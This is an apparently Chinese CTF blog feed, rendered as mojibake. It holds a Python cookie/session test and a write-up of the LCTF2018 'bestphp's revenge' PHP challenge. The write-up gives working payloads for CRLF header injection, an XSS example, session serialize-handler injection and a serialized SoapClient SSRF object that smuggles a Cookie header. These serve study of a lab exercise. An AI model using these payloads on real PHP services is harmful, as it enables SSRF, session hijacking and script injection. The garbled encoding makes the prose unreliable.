class="token operator">=</span>cookies<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬3æ¬¡getï¼š"</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬3æ¬¡çš„cookiesï¼š"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬3æ¬¡çš„sessionçš„cookies ï¼š"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'------------------------------------'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬4æ¬¡getï¼š"</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬4æ¬¡çš„cookiesï¼š"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬4æ¬¡çš„sessionçš„cookies ï¼š"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ç¬¬1æ¬¡getï¼švepn9g7r3lqfc23skjn06te693  FIXç¬¬1æ¬¡çš„cookiesï¼š&lt;RequestsCookieJar[&lt;Cookie TEST&#x3D;TEST for 127.0.0.1&#x2F;&gt;]&gt;ç¬¬1æ¬¡çš„sessionçš„cookies ï¼š&lt;RequestsCookieJar[&lt;Cookie TEST&#x3D;TEST for 127.0.0.1&#x2F;&gt;]&gt;------------------------------------ç¬¬2æ¬¡getï¼š  TESTç¬¬2æ¬¡çš„cookiesï¼š&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;5r5fbk2ljn1n7jo1so7s5qjjuc for 127.0.0.1&#x2F;&gt;, &lt;Cookie TEST&#x3D;TEST for 127.0.0.1&#x2F;&gt;]&gt;ç¬¬2æ¬¡çš„sessionçš„cookies ï¼š&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;5r5fbk2ljn1n7jo1so7s5qjjuc for 127.0.0.1&#x2F;&gt;, &lt;Cookie TEST&#x3D;TEST for 127.0.0.1&#x2F;&gt;]&gt;------------------------------------ç¬¬3æ¬¡getï¼š5r5fbk2ljn1n7jo1so7s5qjjuc  TESTç¬¬3æ¬¡çš„cookiesï¼š&lt;RequestsCookieJar[&lt;Cookie TEST&#x3D;TEST for 127.0.0.1&#x2F;&gt;]&gt;ç¬¬3æ¬¡çš„sessionçš„cookies ï¼š&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;5r5fbk2ljn1n7jo1so7s5qjjuc for 127.0.0.1&#x2F;&gt;, &lt;Cookie TEST&#x3D;TEST for 127.0.0.1&#x2F;&gt;]&gt;------------------------------------ç¬¬4æ¬¡getï¼š5r5fbk2ljn1n7jo1so7s5qjjuc  TESTç¬¬4æ¬¡çš„cookiesï¼š&lt;RequestsCookieJar[&lt;Cookie TEST&#x3D;TEST for 127.0.0.1&#x2F;&gt;]&gt;ç¬¬4æ¬¡çš„sessionçš„cookies ï¼š&lt;RequestsCookieJar[&lt;Cookie PHPSESSID&#x3D;5r5fbk2ljn1n7jo1so7s5qjjuc for 127.0.0.1&#x2F;&gt;, &lt;Cookie TEST&#x3D;TEST for 127.0.0.1&#x2F;&gt;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><p>æ— è®ºæ˜¯å¸¸è§„getè¿˜æ˜¯sessionï¼Œæµç¨‹éƒ½æ˜¯ï¼š</p><p><strong>HTTPè¯·æ±‚-&gt;Serverè®¾ç½®COOKIES-&gt;æŠŠCOOKIESä¼ å›Client-&gt;Clientç¬¬äºŒæ¬¡è¯·æ±‚-&gt;Serverè·å–å¯¹åº”Cookiesã€‚</strong></p><p>ç¬¬ä¸€æ¬¡è¯·æ±‚çš„æ—¶å€™Clientè¿˜æ²¡æœ‰Cookiesæ‰€ä»¥ä¸ä¼šæ‰“å°cookiesã€‚</p><p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°<code>PHPSESSID</code>è¿™ä¸ªCookieå¾ˆç‰¹æ®Šï¼Œç”¨Sessionçš„è¯åªæœ‰åœ¨ç¬¬ä¸€æ¬¡å®¢æˆ·ç«¯è®¾å®šsessionå¹¶è¿”å›çš„æ—¶å€™æ‰ä¼šå‡ºç°åœ¨<code>r</code>çš„<code>cookies</code>é‡Œ(å› ä¸ºéœ€è¦æŠŠcookiesè¿”å›)ï¼Œä¹‹åå°±ä¼šäº¤ç»™<code>s</code>è¿›è¡Œç®¡ç†ã€‚</p><p>è€Œä¸”åœ¨sessionæˆå‹ä¹‹åï¼Œå°±æ— æ³•ç›´æ¥æ·»åŠ åˆ°get/posté‡Œçš„cookieså‚æ•°è¿›è¡Œä¼ å€¼äº†ï¼Œéœ€è¦æ·»åŠ åˆ°sessioné‡Œã€‚</p><p>æ‰€ä»¥æ–¹ä¾¿èµ·è§ï¼Œsessionå°±è€è€å®å®ç”¨<code>cookies.update()</code></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:bestphp&#39;s revenge</title>
      <link href="/p/3063917200.html"/>
      <url>/p/3063917200.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[SoapClient|call_user_func|ssrf]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-bestphp-s-revenge/image-20210812194724455.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'implode'</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'welcome_to_the_lctf2018'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> array(0) &#123; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>/flag.phpè¿”å›</p><pre class="line-numbers language-none"><code class="language-none">only localhost can get flag!session_start();echo &#39;only localhost can get flag!&#39;;$flag &#x3D; &#39;LCTF&#123;*************************&#125;&#39;; if($_SERVER[&quot;REMOTE_ADDR&quot;]&#x3D;&#x3D;&#x3D;&quot;127.0.0.1&quot;)&#123; $_SESSION[&#39;flag&#39;] &#x3D; $flag; &#125;only localhost can get flag!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ˜æ˜¾æ˜¯SSRF</p><h3 id="call-user-funcçŸ¥è¯†ç‚¹"><a href="#call-user-funcçŸ¥è¯†ç‚¹" class="headerlink" title="call_user_funcçŸ¥è¯†ç‚¹"></a>call_user_funcçŸ¥è¯†ç‚¹</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"111"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"333"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"444"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ˜¾ç¤º 111 222 333 444</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœä¼ å…¥çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¸”æ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼æ˜¯ä¸€ä¸ªç±»/å¯¹è±¡ï¼Œé‚£ä¹ˆï¼Œå°±ä¼šæŠŠæ•°ç»„çš„ç¬¬äºŒä¸ªå€¼ï¼Œå½“åšæ–¹æ³•ï¼Œç„¶åæ‰§è¡Œã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">a</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">b</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"b"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//call_user_func(array(ç±»å, å‡½æ•°å),"111");</span><span class="token comment">//æ˜¾ç¤º 111</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CRLF-Injectionæ¼æ´"><a href="#CRLF-Injectionæ¼æ´" class="headerlink" title="CRLF Injectionæ¼æ´"></a>CRLF Injectionæ¼æ´</h3><p><a href="https://www.jianshu.com/p/d4c304dbd0af">[è½¬è½½]CRLF Injectionæ¼æ´çš„åˆ©ç”¨ä¸å®ä¾‹åˆ†æ</a></p><blockquote><p>CRLFæ˜¯â€å›è½¦(%0d)+æ¢è¡Œ(%0a)â€ï¼ˆ\r\nï¼‰çš„ç®€ç§°ã€‚åœ¨HTTPåè®®ä¸­ï¼ŒHTTPHeaderä¸HTTPBodyæ˜¯ç”¨ä¸¤ä¸ªCRLFåˆ†éš”çš„ï¼Œæµè§ˆå™¨å°±æ˜¯æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥å–å‡ºHTTPå†…å®¹å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚æ‰€ä»¥ï¼Œä¸€æ—¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶HTTPæ¶ˆæ¯å¤´ä¸­çš„å­—ç¬¦ï¼Œæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æ³¨å…¥ä¸€äº›ä¼šè¯Cookieæˆ–è€…HTMLä»£ç ï¼Œæ‰€ä»¥CRLFInjectionåˆå«HTTPResponseSplittingï¼Œç®€ç§°HRSã€‚</p></blockquote><p>æ¯”å¦‚ä¸€ä¸ª302è·³è½¬ï¼š<a href="http://127.0.0.1/?url=http://www.sina.com.cn">http://127.0.0.1/?url=http://www.sina.com.cn</a></p><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 302Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMTContent- Type: text&#x2F;htmlContent-Length: 154Connection: closeLocation:http:&#x2F;&#x2F;www.sina.com.cn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘è¾“å…¥ï¼š</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.sina.com.cn%0aSet-cookie:JSPSESSID%3Dwooyun<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿”å›çš„æ•°æ®åŒ…å°±æ˜¯</p><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 302 Moved Temporarily Date: Fri, 27 Jun 2014 17:52:17 GMTContent-Type: text&#x2F;htmlContent-Length: 154Connection: closeLocation: http:&#x2F;&#x2F;www.sina.com.cn Set-cookie: JSPSESSID&#x3D;wooyun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿˜å¯ä»¥ç”¨æ¥xss</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;test.sina.com.cn&#x2F;?url&#x3D;%0d%0a%0d%0a&lt;imgsrc&#x3D;1onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æµè§ˆå™¨ä¼šæ ¹æ®ç¬¬ä¸€ä¸ªCRLFæŠŠHTTPåŒ…åˆ†æˆheaderå’Œbodyï¼Œç„¶åå°†bodyæ˜¾ç¤ºå‡ºæ¥ã€‚äºæ˜¯æˆ‘ä»¬è¿™é‡Œè¿™ä¸ªæ ‡ç­¾å°±ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œé€ æˆä¸€ä¸ªxssã€‚</p><p>å…³äºè¿™é¢˜çš„<code>SoapClient</code>ç±»ï¼Œæ²¡æœ‰æŒ‡å®šcookieï¼Œä½†åˆ<code>user_agent</code>ï¼Œæ‰€ä»¥å¯ä»¥åœ¨<code>user_agent</code>é‡ŒåŠ ä¸Šä¸€ä¸ª<code>\r\n</code>å†åŠ cookieã€‚</p><h3 id="serialize-handerå¤„ç†sessionæ–¹å¼ä¸åŒå¯¼è‡´sessionæ³¨å…¥"><a href="#serialize-handerå¤„ç†sessionæ–¹å¼ä¸åŒå¯¼è‡´sessionæ³¨å…¥" class="headerlink" title="serialize_handerå¤„ç†sessionæ–¹å¼ä¸åŒå¯¼è‡´sessionæ³¨å…¥"></a>serialize_handerå¤„ç†sessionæ–¹å¼ä¸åŒå¯¼è‡´sessionæ³¨å…¥</h3><p>é¦–å…ˆï¼Œsessionä¸­çš„å†…å®¹å¹¶ä¸æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯é»˜è®¤ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œå¯ç”±é…ç½®é¡¹session.save_handleræ¥è¿›è¡Œç¡®å®šã€‚å­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥sess_sessionidæ¥è¿›è¡Œå‘½åçš„ï¼Œæ–‡ä»¶çš„å†…å®¹å°±æ˜¯sessionå€¼çš„åºåˆ—åŒ–ä¹‹åçš„å†…å®¹ã€‚</p><p>ç„¶åï¼Œphpåºåˆ—åŒ–å¼•æ“ä¹Ÿæœ‰ä¸åŒè¡¨ç°ï¼š</p><p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶</a></p><ul><li><p>php_serializeå¼•æ“</p><pre class="line-numbers language-none"><code class="language-none">$_SESSION[&#39;name&#39;] &#x3D; &#39;sky&#39;;a:1:&#123;s:4:&quot;name&quot;;s:3:&quot;sky&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>PHPå¼•æ“</p><pre class="line-numbers language-none"><code class="language-none">$_SESSION[&#39;name&#39;] &#x3D; &#39;sky&#39;;name|s:3:&quot;sky&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>php_binaryå¼•æ“</p><p>é”®åçš„é•¿åº¦å¯¹åº”çš„asciiå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–åçš„å€¼</p></li></ul><p>åœ¨è¿™é‡Œå°±æœ‰ååºåˆ—åŒ–æ¼æ´äº†ï¼Œå¦‚æœç”¨<code>php_serialize</code>åšåºåˆ—åŒ–å¼•æ“ï¼Œä¸”<code>php_serialize</code>åšåºåˆ—åŒ–å¼•æ“</p><pre class="line-numbers language-none"><code class="language-none">$_SESSION[&#39;name&#39;] &#x3D; &#39;|sky&#39;;a:1:&#123;s:4:&quot;name&quot;;s:3:&quot;|sky&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç„¶åå†ç”¨PHPå¼•æ“å»ååºåˆ—åŒ–ï¼Œå› ä¸ºphpä»¥<code>|</code>ç¬¦å·åˆ†éš”é”®ä¸å€¼ï¼Œæ‰€ä»¥å°±ä¼šå˜æˆ<code>a:1:&#123;s:4:&quot;name&quot;;s:3:&quot;</code>=<code>sky</code>çš„æƒ…å†µï¼Œè¿™æ ·skyå°±è¢«å•ç‹¬æ‹¿äº†å‡ºæ¥è¿›è¡Œ<strong>ååºåˆ—åŒ–</strong>ï¼Œè€Œä¸æ˜¯ä½œä¸ºå­—ç¬¦ä¸²æ‰“å°å‡ºæ¥ã€‚è‡³äºåé¢çš„<code>&quot;;&#125;s</code>ï¼Œphpååºåˆ—åŒ–çš„è§„åˆ™æ˜¯<strong>å‰æ–¹é—­åˆåé¢å°±å¿½ç•¥</strong>(è¿™ä¹Ÿæ˜¯ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸çš„åŸç†)ã€‚</p><p>phpé»˜è®¤æ˜¯ç”¨PHPå¼•æ“ï¼Œå¯ç”¨<code>ini_set(&#39;session.serialize_handler&#39;, &#39;éœ€è¦è®¾ç½®çš„å¼•æ“&#39;)</code>åˆ‡æ¢ï¼Œä½†å‚æ•°ä¸æ”¯æŒæ•°ç»„ã€‚</p><p>æ‰€ä»¥æ­¤é¢˜ç”¨</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"serialize_handler"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"php_serialize"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SoapClient-SSRF"><a href="#SoapClient-SSRF" class="headerlink" title="SoapClient SSRF"></a>SoapClient SSRF</h3><blockquote><p>å¦‚æœæç¤º<code>Class &#39;SoapClient&#39; not found</code>å°±åœ¨php.inié‡Œå¯ç”¨extension=php_soap.dll</p></blockquote><blockquote><p>SOAPæ˜¯webServiceä¸‰è¦ç´ ï¼ˆSOAPã€WSDL(WebServicesDescriptionLanguage)ã€UDDI(UniversalDescriptionDiscovery andIntegration)ï¼‰ä¹‹ä¸€ï¼šWSDL ç”¨æ¥æè¿°å¦‚ä½•è®¿é—®å…·ä½“çš„æ¥å£ï¼Œ UDDIç”¨æ¥ç®¡ç†ï¼Œåˆ†å‘ï¼ŒæŸ¥è¯¢webService ï¼ŒSOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®åè®®ï¼‰æ˜¯è¿æ¥æˆ–WebæœåŠ¡æˆ–å®¢æˆ·ç«¯å’ŒWebæœåŠ¡ä¹‹é—´çš„æ¥å£ã€‚å…¶é‡‡ç”¨HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ã€‚<br>SoapClientç±»å¯ä»¥åˆ›å»ºsoapæ•°æ®æŠ¥æ–‡ï¼Œä¸wsdlæ¥å£è¿›è¡Œäº¤äº’ã€‚</p></blockquote><p>è¿™æ˜¯ä¸€ä¸ªphpå†…ç½®çš„ç±»ï¼Œå½“__callæ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€HTTPå’ŒHTTPSè¯·æ±‚ã€‚è¯¥ç±»çš„æ„é€ å‡½æ•°å¦‚ä¸‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token class-name static-context">SoapClient</span> <span class="token operator">::</span> <span class="token constant">SoapClient</span> ï¼ˆ<span class="token keyword type-declaration">mixed</span> <span class="token variable">$wsdl</span> <span class="token punctuation">[</span>ï¼Œ<span class="token keyword type-declaration">array</span> <span class="token variable">$options</span> <span class="token punctuation">]</span>ï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼</p><p>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuriæ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚</p><p>çŸ¥é“ä¸Šè¿°ä¸¤ä¸ªå‚æ•°çš„å«ä¹‰åï¼Œå°±å¾ˆå®¹æ˜“æ„é€ å‡ºSSRFçš„åˆ©ç”¨payloadäº†ã€‚æˆ‘ä»¬å¯ä»¥è®¾ç½®ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œç„¶åç¬¬äºŒä¸ªå‚æ•°çš„locationé€‰é¡¹è®¾ç½®ä¸ºtarget_url</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location'</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"http://127.0.0.1/flag.php"</span><span class="token punctuation">,</span>                                 <span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span> <span class="token string double-quoted-string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è§£æ"><a href="#è§£æ" class="headerlink" title="è§£æ"></a>è§£æ</h3><h4 id="å†™å…¥session"><a href="#å†™å…¥session" class="headerlink" title="å†™å…¥session"></a>å†™å…¥session</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"http://127.0.0.1/flag.php"</span><span class="token punctuation">;</span><span class="token variable">$attack</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string single-quoted-string">'location'</span> <span class="token operator">=></span> <span class="token variable">$target</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'user_agent'</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"N0rth3ty\r\nCookie: PHPSESSID=817olmp68ukmnofc2mlp762ql0\r\n"</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'uri'</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$attack</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”Ÿæˆpayloadï¼Œç„¶ååœ¨å‰é¢åŠ ä¸ª<code>|</code></p><pre class="line-numbers language-url" data-language="url"><code class="language-url">?name&#x3D;|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3D817olmp68ukmnofc2mlp762ql0%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&amp;f&#x3D;session_startPOST:serialize_handler&#x3D;php_serialize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-bestphp-s-revenge/image-20210813005433053.png"></p><p>1.åˆ©ç”¨<code>call_user_func($_GET[â€˜fâ€™], $_POST);</code>å‡½æ•°ï¼Œæ”¹å˜æ­¤é¡µé¢çš„åºåˆ—åŒ–å¼•æ“ä¸º<code>php_serialize</code></p><p>2.<code>$_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];</code>å°†æ„é€ çš„åºåˆ—åŒ–å¯¹è±¡ä¼ å…¥sessionä¸­ï¼Œå¹¶åœ¨å‰é¢åŠ ä¸€ä¸ª<code>|</code>ç¬¦å·ã€‚æ­¤æ—¶sessionä¼šä»¥<code>php_serialize</code>çš„è§„åˆ™å‚¨å­˜ã€‚</p><h4 id="è§¦å‘ååºåˆ—åŒ–"><a href="#è§¦å‘ååºåˆ—åŒ–" class="headerlink" title="è§¦å‘ååºåˆ—åŒ–"></a>è§¦å‘ååºåˆ—åŒ–</h4><pre class="line-numbers language-none"><code class="language-none">?f&#x3D;extractPOST:b&#x3D;call_user_func<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img 